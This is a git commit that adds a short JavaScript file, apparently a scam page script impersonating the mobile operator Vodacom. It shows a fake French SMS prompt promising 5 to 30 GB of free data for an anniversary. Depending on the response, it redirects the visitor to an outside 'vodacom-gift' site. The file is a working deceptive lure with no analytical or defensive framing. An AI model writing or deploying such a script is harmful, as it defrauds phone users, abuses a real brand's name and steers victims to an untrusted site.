3da5b1531a798ab3068a4f16898aa62985ce1200
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-05-05 11:28:30 -0700

    Create vodacom-verify.js

---
+++ vodacom-verify.js
@@ -0,0 +1,5 @@
+var password = '23 Years Anniversary'
+password=prompt('SMS: Félicitations ! Votre numéro de mobile est éligible pour recevoir entre 5 Go et 30 Go. Cliquez sur OK pour activer.','23 Years Anniversary');
+if (password != '23 Years Anniversary') {
+location.href='https://ebekpone.com/vodacom-gift';
+}
